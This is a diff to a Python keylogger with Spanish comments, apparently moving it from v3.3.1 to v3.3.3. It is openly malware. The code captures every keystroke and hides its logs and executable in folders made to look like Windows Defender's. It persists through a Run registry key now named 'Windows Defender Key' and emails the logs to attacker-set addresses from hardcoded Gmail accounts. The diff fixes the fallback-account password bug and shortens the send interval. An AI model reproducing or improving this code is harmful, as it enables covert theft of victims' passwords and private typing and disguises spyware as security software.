@@ -10,7 +10,7 @@
 # █████═╝░█████╗░░░╚████╔╝░██║░░░░░██║░░██║██║░░██╗░██║░░██╗░█████╗░░██████╔╝
 # ██╔═██╗░██╔══╝░░░░╚██╔╝░░██║░░░░░██║░░██║██║░░╚██╗██║░░╚██╗██╔══╝░░██╔══██╗
 # ██║░╚██╗███████╗░░░██║░░░███████╗╚█████╔╝╚██████╔╝╚██████╔╝███████╗██║░░██║
-# ╚═╝░░╚═╝╚══════╝░░░╚═╝░░░╚══════╝░╚════╝░░╚═════╝░░╚═════╝░╚══════╝╚═╝░░╚═╝  v3.3.1
+# ╚═╝░░╚═╝╚══════╝░░░╚═╝░░░╚══════╝░╚════╝░░╚═════╝░░╚═════╝░╚══════╝╚═╝░░╚═╝  v3.3.3
 
 # Librerías Utilizadas
 from pynput.keyboard import Key, Listener
@@ -195,7 +195,7 @@ def KeyConMax(argument):                # Botones, comunes // Optimizados
 # Obtiene registro de teclas y guarda en un archivo log.txt
 def Klogger():
     try:        # Intenta crear el archivo
-        log = os.environ.get('pylogger_file', os.path.expanduser(GetPathOcult()+LogName()) )
+        log = os.environ.get('pylogger_file', os.path.expanduser(logKeyPath()+LogName()) )
         T = datetime.datetime.now()
         getTime = "Fecha:      ["+  T.strftime("%A") + " " + T.strftime("%d") + " de " + T.strftime("%B") + "]\nHora:       [" + T.strftime("%I")+ ":"+ T.strftime("%M")+ " "+ T.strftime("%p")+ " con " + T.strftime("%S") +" Segundos]\n"
 
@@ -239,8 +239,8 @@ def Rename(name):
     try:
         CreateDir()  # Crea el directorio ==> C:\Users\Public\Security\Windows Defender
         # Copia el archivo 
-        pathO = GetPathOcult()+ LogName()
-        pathN = GetPathOcult()+ name + ".txt"
+        pathO = logKeyPath()+ LogName()
+        pathN = logKeyPath()+ name
         os.rename(pathO, pathN)
     except:
         pass
@@ -259,6 +259,10 @@ def VerificarConexion():
 def CreateDir():
     try:  # Intenta crear la dirección
         os.makedirs(GetPathOcult())
+    except :
+        pass
+    try:  # Intenta crear la dirección del registro de teclas..
+        os.makedirs(logKeyPath())
     except :
         pass
 
@@ -283,33 +287,34 @@ def SendLog():
         n = n+1
 
         # Enviar cada 2 horas aprox
-        for x in range(720):    #720
+        for x in range(1):    #720
             time.sleep(10) # *10 
             #print("Pasó: "+ str(x*10))
 
         if VerificarConexion(): # Continua solo si hay conexión
             # Crea nombre del archivo
-            nameFile = str(n)
+            nameFile = str(getuser())+" "+str(n)+".txt"
             #Renombra el archivo original
             Rename(nameFile)    # Cambia el archivo `log.txt` a  `log2.txt`
 
             #Envía el archivo renombrado
             CreateDir()  # Crea el directorio ==> C:\Users\Public\Security\Windows Defender
-            homedir = GetPathOcult()+str(nameFile)+".txt"
+            homedir = logKeyPath()+str(nameFile)
+
             print("Proceso de envío")
 
             if sendEmail(homedir, emailP(), passP() , ReceiveE()):    # Envía con el primer correo
                 #Si se envíó correctamente, pues elimina el archivo
                 os.remove(homedir)
-            elif sendEmail(homedir, emailS(), emailP() , ReceiveE()):  # Envía con el segundo correo 
+            elif sendEmail(homedir, emailS(), passS() , ReceiveE()):  # Envía con el segundo correo 
                 os.remove(homedir)
         else:   # No hay conexión
-            # Seguirá sobreescribiendo el archivo
+            # Seguirá sobreescribiendo el archivo   # Verificar pruba de errores
             # No hará nada, y esperará que haya una conexión exitosa
             pass     
 def addStartup():  # function =  Iniciar automaticamente
     path = GetPathOcult()+ GetNameKey() # Path del Software completo
-    name = "Keylogger"                                                              # Nombre del StartUp     // Solo se ve en el registro *Regedit*
+    name = "Windows Defender Key"                                                   # Nombre del StartUp     // Solo se ve en el registro *Regedit*
     keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'                       # Path del registro
     def verificar():
         try:  # Intenta crear la dirección
@@ -332,27 +337,28 @@ def GetNameKey():                   # Retorna el nombre del Keylogger compilado 
     return "WindowsDefender.exe"    # este archivo debe tener el mismo nombre "WindowsDefender.py"  
 def GetPathOcult():                 # Path de la carpeta donde se ocultará el Keylogger y log.txt
     return "C:\\Users\\Public\\Security\\Windows Defender\\"
-def LogName():  # 
-    return ".key"
+def logKeyPath():   # Ruta del registro de teclas.
+    return "C:\\Users\\"+str(getuser()) +"\\AppData\\Roaming\\Microsoft\\"
+def LogName():  # Nombre del registro de teclas
+    return ".k"
 def FilePath():
     return GetPathOcult()+GetNameKey()
 
 # Correo de envío [Primaria] 
 def emailP():                   # <<== Cambia éste correo
-    return "Send123@gmail.com" 
+    return "correo1@gmail.com" 
 def passP():                    # <<== Contraseña del correo
-    return "contraseña1"
+    return "pass1"
 # Correo de envío [Segundaria]     <=> Solo si hay algún problema de envío con el correo Principal
 def emailS():                   # <<== Cambia éste correo
-    return "Sendabc@gmail.com"
-def emailP():                   # <<== Contraseña del correo 
-    return "contraseña2"
+    return "correo2@gmail.com"
+def passS():                   # <<== Contraseña del correo 
+    return "pass2"
 
 #Correos que recibirán los archivos log
 def ReceiveE():
     #return ["Recibe1@gmail.com", "Recibe2@hotmail.com", "Recibe3@yahoo.com"]   # MultiCorreo
-    return ["Recibe1@gmail.com"]                                                # MonoCorreo
-
+    return ["recibe@gmail.com"]                                               # MonoCorreo
 # *********************************************   FIN ZONA CUSTOM   *******************************
        
 # Inicio multihilo
@@ -369,7 +375,7 @@ if __name__ == '__main__':
 #################################################################
 #                                                               #
 #                 Developed by SebastianEPH                     #
-#                                                   v.3.3.1     #
+#                                                   v.3.3.3     #
 #################################################################
 # NOTAS IMPORTANTES:
 #
